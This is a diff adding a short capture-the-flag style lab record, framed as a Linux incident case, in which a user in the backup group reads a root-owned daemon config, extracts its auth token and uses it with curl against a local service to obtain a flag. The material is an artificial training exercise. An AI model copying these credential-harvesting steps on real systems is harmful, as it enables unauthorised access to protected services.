@@ -1,0 +1,18 @@
+[INCIDENT CASE #2026-IE3132 - LINUX SYSTEM SECURITY]
+TARGET NODE: isolated-audit-host.local
+
+--- PERMISSION AUDIT ---
+$ id
+uid=1001(intern) gid=1001(intern) groups=1001(intern),104(backup)
+
+$ ls -la /var/backups/
+drwxr-xr-x  2 root root   4096 Sep 21 08:00 .
+-rw-r-----  1 root backup  824 Sep 21 08:05 legacy_daemon.conf
+
+$ cat /var/backups/legacy_daemon.conf
+[daemon]
+listen = 127.0.0.1:8080
+auth_token = "tok_linux_priv_2026"
+
+$ curl -H "Authorization: Bearer tok_linux_priv_2026" http://127.0.0.1:8080/flag
+{"status":"success","flag":"IE3132{linux_demo}"}
